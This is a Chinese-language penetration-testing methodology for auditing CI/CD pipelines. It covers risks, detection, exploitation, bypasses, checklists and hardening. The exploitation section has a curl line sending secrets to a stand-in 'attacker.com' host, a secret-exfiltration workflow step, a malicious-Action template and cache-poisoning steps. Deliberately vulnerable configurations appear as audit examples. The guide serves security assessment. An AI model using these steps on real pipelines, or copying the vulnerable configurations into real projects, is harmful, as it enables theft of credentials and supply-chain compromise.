# CI/CD 安全审计方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供 CI/CD 管道安全审计的系统化方法
- 指导测试人员识别 CI/CD 配置中的安全弱点和风险
- 帮助理解持续集成/持续部署流程中的攻击面

## 1.2 适用范围
- 适用于使用 GitHub Actions、GitLab CI、Jenkins、CircleCI 等 CI/CD 平台的环境
- 适用于自动化构建、测试、部署流程
- 适用于 DevSecOps 安全评估场景

## 1.3 读者对象
- 渗透测试工程师
- DevSecOps 工程师
- 安全审计人员
- CI/CD 管理员

---

# 第二部分：核心渗透技术专题

## 专题一：CI/CD 安全审计

### 2.1 技术介绍

CI/CD 安全审计是指对持续集成/持续部署管道的配置、权限、凭证管理、构建流程等进行系统性安全检查，识别可能导致代码泄露、凭证窃取、恶意代码注入等风险的安全弱点。

**审计核心要素：**

```
┌─────────────────────────────────────────────────────────────┐
│                    CI/CD 安全审计框架                        │
├─────────────────────────────────────────────────────────────┤
│  1. 配置安全    - 工作流/流水线配置是否正确                  │
│  2. 凭证管理    - 密钥/令牌是否安全存储和使用                │
│  3. 权限控制    - 角色权限是否遵循最小权限原则              │
│  4. 依赖安全    - 使用的 Actions/插件是否可信               │
│  5. 构建安全    - 构建过程是否可被篡改                      │
│  6. 部署安全    - 部署目标是否有适当保护                    │
└─────────────────────────────────────────────────────────────┘
```

**常见安全问题：**

| 问题类型 | 描述 | 危害等级 |
|---------|------|---------|
| 硬编码凭证 | 密钥直接写在配置文件中 | 严重 |
| 过度权限 | Service Account 权限过大 | 高 |
| 不安全的 Actions | 使用未验证的第三方 Actions | 高 |
| PR 注入攻击 | 恶意 PR 可触发敏感操作 | 严重 |
| 构建缓存污染 | 共享缓存被恶意修改 | 中 |
| 日志泄露 | 敏感信息输出到日志 | 中 |

### 2.2 审计常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 开源项目 CI | GitHub Actions 工作流 | 外部 PR 可能触发敏感操作 |
| 自动化部署 | 自动部署到生产环境 | 缺乏审批和验证 |
| 多环境构建 | dev/staging/prod 多环境 | 环境隔离不当 |
| 凭证管理 | 使用 Secrets 存储密钥 | Secrets 可能泄露 |
| 第三方集成 | 集成 Slack、AWS 等 | 集成配置可能不当 |
| 制品发布 | 自动发布到 npm/Maven | 发布流程可能被劫持 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：识别 CI/CD 平台**
```bash
# 检查常见 CI/CD 配置文件
curl https://target.com/.github/workflows/ci.yml
curl https://target.com/.gitlab-ci.yml
curl https://target.com/Jenkinsfile
curl https://target.com/azure-pipelines.yml
curl https://target.com/.circleci/config.yml

# 检查 CI/CD 相关目录
curl https://target.com/.github/
```

**步骤二：检查公开的工作流**
```bash
# GitHub Actions
# 查看公开仓库的 Actions 标签
# https://github.com/user/repo/actions

# 检查工作流运行历史
# 可能泄露敏感信息
```

**步骤三：日志分析**
```bash
# 检查 CI/CD 日志是否公开
# GitHub Actions 日志可能包含 Secrets

# 查找泄露的凭证模式
grep -E "(AKIA|ghp_|xoxb-|sk-)" logs.txt
```

#### 2.3.2 白盒测试

**步骤一：审计 GitHub Actions 配置**
```yaml
# 检查 .github/workflows/*.yml

# 风险点检查清单：
# 1. pull_request_target 触发器
# 2. 使用未锁定的 Actions 版本
# 3. secrets 在日志中输出
# 4. 可写权限的 GITHUB_TOKEN
# 5. 命令注入风险

# 示例：危险配置
on:
  pull_request_target:  # 危险：可执行恶意代码
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2  # 应使用具体 hash
      - run: npm install  # PR 中的 package.json 可能恶意
```

**步骤二：审计 GitLab CI 配置**
```yaml
# 检查 .gitlab-ci.yml

# 风险点检查清单：
# 1. 变量明文存储
# 2. 未保护的分支触发
# 3. 外部镜像使用
# 4.  artifacts 泄露

variables:
  DB_PASSWORD: "hardcoded_password"  # 危险：硬编码

deploy_prod:
  stage: deploy
  script:
    - echo $DEPLOY_KEY | base64 -d  # 危险：密钥使用
  only:
    - master  # 应使用 protected branches
```

**步骤三：审计 Jenkins 配置**
```groovy
// 检查 Jenkinsfile

// 风险点检查清单：
// 1. 凭证 ID 暴露
// 2. shell 命令注入
// 3. 未授权的脚本执行
// 4. 过时的插件

pipeline {
    agent any
    environment {
        // 危险：凭证可能被日志输出
        CREDENTIALS = credentials('my-credentials')
    }
    stages {
        stage('Build') {
            steps {
                // 危险：用户输入直接执行
                sh "npm install ${params.NPM_PACKAGE}"
            }
        }
    }
}
```

### 2.4 漏洞利用方法

#### 2.4.1 PR 注入攻击

```bash
# 1. 创建恶意 PR
# 修改 CI/CD 配置文件或构建脚本

# 2. 如果配置了 pull_request_target
# 恶意代码将在目标仓库上下文中执行

# 示例：窃取 Secrets
echo "::set-output name=secret::${{ secrets.DEPLOY_TOKEN }}"

# 3. 通过日志或外带获取敏感信息
curl "http://attacker.com/exfil?data=${{ secrets.API_KEY }}"
```

#### 2.4.2 凭证窃取

```bash
# GitHub Actions 凭证窃取
- name: Exfiltrate Secrets
  run: |
    echo "AWS_KEY=${{ secrets.AWS_ACCESS_KEY_ID }}" >> $GITHUB_OUTPUT
    echo "AWS_SECRET=${{ secrets.AWS_SECRET_ACCESS_KEY }}" >> $GITHUB_OUTPUT

# GitLab CI 凭证窃取
variables:
  EXPOSED_TOKEN: $CI_JOB_TOKEN

# 通过日志获取
```

#### 2.4.3 恶意 Actions 利用

```bash
# 1. 发现目标使用第三方 Actions
uses: some-user/some-action@v1

# 2. 如果该 Actions 被入侵或恶意
# 可以执行任意代码

# 3. 或者创建相似的恶意 Actions
# 诱导目标使用

# 示例：恶意 Actions 代码
name: 'Legitimate Action'
description: 'Does something useful'
runs:
  using: 'docker'
  image: 'Dockerfile'  # 包含恶意代码的镜像
```

#### 2.4.4 构建缓存投毒

```bash
# 1. 识别共享缓存
# GitHub Actions: actions/cache
# GitLab CI: cache 关键字

# 2. 污染缓存内容
- name: Poison Cache
  run: |
    echo "malicious_code" >> ~/.npm/_cacache/content

# 3. 后续构建使用被污染的缓存
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过分支保护

```bash
# 1. 利用未保护的分支
# 直接推送恶意代码

# 2. 利用管理员权限
# 如果获取了 admin 权限

# 3. 利用 Webhook
# 触发自动化流程
```

#### 2.5.2 绕过凭证保护

```bash
# 1. 利用日志输出
# 如果 Secrets 被打印到日志

# 2. 利用错误信息
# 触发错误可能暴露凭证

# 3. 利用子进程
# 子进程可能继承环境变量
```

---

# 第三部分：附录

## 3.1 CI/CD 安全审计检查表

| 检查项 | 是/否 | 风险等级 |
|-------|------|---------|
| 使用 pull_request_target 触发器 | | 严重 |
| Secrets 硬编码在配置中 | | 严重 |
| 使用未锁定版本的 Actions | | 高 |
| 外部 PR 可触发敏感操作 | | 高 |
| 构建产物无签名 | | 中 |
| 日志包含敏感信息 | | 中 |
| 无分支保护策略 | | 高 |
| 部署无需审批 | | 高 |

## 3.2 常见凭证模式

| 平台 | 凭证前缀 | 示例 |
|-----|---------|------|
| GitHub Token | ghp_, gho_, ghu_, ghs_, ghr_ | ghp_xxxxxxxxxxxx |
| AWS Access Key | AKIA | AKIAIOSFODNN7EXAMPLE |
| AWS Secret Key | 40 字符 | wJalrXUtnFEMI/K7MDENG |
| Slack Token | xoxb-, xoxp-, xoxa- | xoxb-xxxxxxxxxxxx |
| Stripe Key | sk_live_, pk_live_ | sk_live_xxxxxxxxxx |
| npm Token | npm_ | npm_xxxxxxxxxxxx |

## 3.3 安全配置示例

```yaml
# GitHub Actions 安全配置
name: CI
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read  # 最小权限
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # 锁定 hash
      - name: Build
        run: npm ci  # 使用 ci 而非 install
```

## 3.4 审计工具

| 工具名称 | 用途 | 链接 |
|---------|------|------|
| zizmor | GitHub Actions 审计 | https://github.com/woodruffw/zizmor |
| gitleaks | 凭证扫描 | https://github.com/gitleaks/gitleaks |
| trufflehog | 凭证扫描 | https://github.com/trufflesecurity/trufflehog |
| checkov | IaC 安全扫描 | https://github.com/bridgecrewio/checkov |

---

## 参考资源

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [GitLab CI/CD Security](https://docs.gitlab.com/ee/ci/security/)
- [Jenkins Security Guidelines](https://www.jenkins.io/doc/book/security/)
- [OWASP CI/CD Security](https://owasp.org/www-project-devsecops-guideline/)
